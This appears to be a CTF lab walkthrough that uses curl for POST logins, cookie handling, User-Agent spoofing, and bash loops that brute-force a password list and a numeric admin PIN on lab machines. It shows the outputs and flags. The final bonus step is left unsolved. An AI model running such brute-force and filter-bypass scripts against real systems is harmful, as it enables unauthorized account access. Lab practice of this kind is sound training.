## Walkthrough of Day 24 - Exploitation with cURL - Hoperation Eggsploit



## Theory - What will we learn?
* Understand what HTTP requests and responses are at a high level.
* Use cURL to make basic requests (using GET) and view raw responses in the terminal.
* Send POST requests with cURL to submit data to endpoints.
* Work with cookies and sessions in cURL to maintain login state across requests

### Practical curl Commands for exploitation
```bash
#Porpuse:Send web-request using cli
curl $URL

#Porpuse: Send POST request
curl -X POST -d "username=user&password=user" #URL
# Add -i to see full response of the website
# (including headers and potential redirects)
curl -i -X POST -d "username=user&password=user&submit=Login" http://10.66.186.152/post.php

```
* If the site responds with a Set-Cookie header, that's a good sign, it means you've successfully logged in or at least triggered a session.

### After the connection
* After succesfull log in , website generate cookie 
* In every request after it we need to send the coookie + the request
* We can to save the cookie in a `cookie.txt `file
```bash
# Save the generated cookie into a cookie.txt file
curl -c cookies.txt -d "username=admin&password=admin" http://10.65.174.222/session.php

# Use the cookie file in a request
curl -b cookies.txt http://10.65.174.222/session.php
```

### Automating a brute-force
1. Create a passwords file
2. create a bash script to automate curl usage
```bash
for pass in $(cat passwords.txt); do
  echo "Trying password: $pass"
  response=$(curl -s -X POST -d "username=admin&password=$pass" http://10.65.174.222/bruteforce.php)
  if echo "$response" | grep -q "Welcome"; then
    echo "[+] Password found: $pass"
    break
  fi
done
```
3. save the base script `script.sh`
4. add execute permission `sudo chmod +x script.sh`
5. Run!!!
* Note --> Tools like `Hydra, Burp Intruder, and WFuzz` use the same exact method 

### Bypassing User-Agent Checks
* Some website block curl user agent
* we can bypass this by specifying a user agent
```bash
curl -i -A "internalcomputer" http://10.65.174.222/ua_check.php
```
### Practical
#### Q:Make a POST request to the /post.php endpoint with the username admin and the password admin. What is the flag you receive?
* machine ip is `10.65.151.253`
```bash
curl -X POST -d "username=admin&password=admin" http://10.65.151.253/post.php 
```

```bash
#Output
Login successful!
Flag: THM{curl_post_success}

```

#### A: 'THM{curl_post_success}'
#### Q:Make a request to the /cookie.php endpoint with the username admin and the password admin and save the cookie. Reuse that saved cookie at the same endpoint. What is the flag your receive?
```bash
curl -c cookies.txt -d "username=admin&password=admin" http://10.65.151.253/cookie.php
curl -b cookies.txt http://10.65.151.253/cookie.php 

```
```bash
#Output
Login successful!
Welcome back, admin!
Flag: THM{session_cookie_master}

```

#### A: 'THM{session_cookie_master}'
#### Q:After doing the brute force on the /bruteforce.php endpoint, what is the password of the admin user?
1. Create pass list `passwords.txt`
```
admin123
password
letmein
secretpass
secret
```
2. Create a script to bruteforce using the machine's IP
```bash
for pass in $(cat passwords.txt); do
  echo "Trying password: $pass"
  response=$(curl -s -X POST -d "username=admin&password=$pass" http://10.65.151.253/bruteforce.php)
  if echo "$response" | grep -q "Welcome"; then
    echo "[+] Password found: $pass"
    break
  fi
done

```
3. Save the script as `script.sh`
4. Run the script using 

`bash script.sh`

```
bash script.sh 
Trying password: admin123
Trying password: password
Trying password: letmein
Trying password: secretpass
[+] Password found: secretpass
```
#### A: 'secretpass'
#### Q:Make a request to the /agent.php endpoint with the user-agent TBFC. What is the flag your receive?

```bash
curl -A "TBFC" http://10.65.151.253/agent.php   

```

```bash
#Output
Flag: THM{user_agent_filter_bypassed}

```

#### A: 'THM{user_agent_filter_bypassed}'
#### Q:Bonus question: Can you solve the Final Mission and get the flag?
*We get this endpoint
`http://10.65.159.172/terminal.php?action=panel`
* Lest try to access this endpoint

`curl "http://10.65.159.172/terminal.php?action=panel"`
```bash
#Output:
This admin panel is terminal-only and is only accessible using secretcomputer
```
* Lets try to modify the user-agent
`curl -A "secretcomputer" "http://10.65.159.172/terminal.php?action=panel"`

```bash
#Output:
"service": "Wormhole Control Panel",
    "endpoints": {
        "\/terminal.php?action=info": "Public info",
        "\/terminal.php?action=login": "POST: username,password",
        "\/terminal.php?action=pin": "POST: attempt PIN to get temporary admin token",
        "\/terminal.php?action=status": "GET: wormhole status",
        "\/terminal.php?action=close": "POST: close wormhole"
    },
    "note": "This panel only answers to terminal user agents. Use the endpoints to fully close the wormhole."
```
* lets make a brute-force script
```bash
for i in {4000..5000}; do
    echo "Trying $i"
    response=$(curl -s -A "secretcomputer" -d "pin=$i" "http://10.65.159.172/terminal.php?action=pin")
    
    if [[ "$response" != *"Incorrect PIN"* ]]; then
        echo "Found it! The PIN is: $i"
        echo "Server Response: $response"
        break
    else
		echo "$i --> Fail"
    fi
done

```
```bash
#output
Trying 4731
Found it! The PIN is: 4731
Server Response: {
    "status": "ok",
    "operator_token": "5acf4373cd4c031d67aeae6d9023977ea0b92822999ab441733c5718ad236037",
    "note": "This token is valid for the day. Use it as Bearer or X-Operator header."
}

```
* lets use the pin to get  the admin cookie
```bash
curl -A "secretcomputer" -c admincookie.txt -H "X-Operator: 5acf4373cd4c031d67aeae6d9023977ea0b92822999ab441733c5718ad236037" "http://10.65.159.172/terminal.php?action=status"
```
```json
{
    "wormhole": "OPEN",
    "reinforcements": "ENABLED",
    "last_update": "2025-12-24T18:03:27+00:00",
    "is_admin": "true",
    "operator_token_valid": true
} 
```

* Lets close the portal
```bash
curl -A "secretcomputer" -X POST -b admincookie.txt -H "X-Operator: f86402a3dcd3cf82ab23ce475ab8fdbd532060ac073b3294eb3195ae1d9712af" "http://10.65.159.172/terminal.php?action=close"

```

```json
{
    "status": "denied",
    "msg": "Missing admin session, operator token, or X-Force header. All three required."
}  
```

#### A: ''





## You completed the room!!!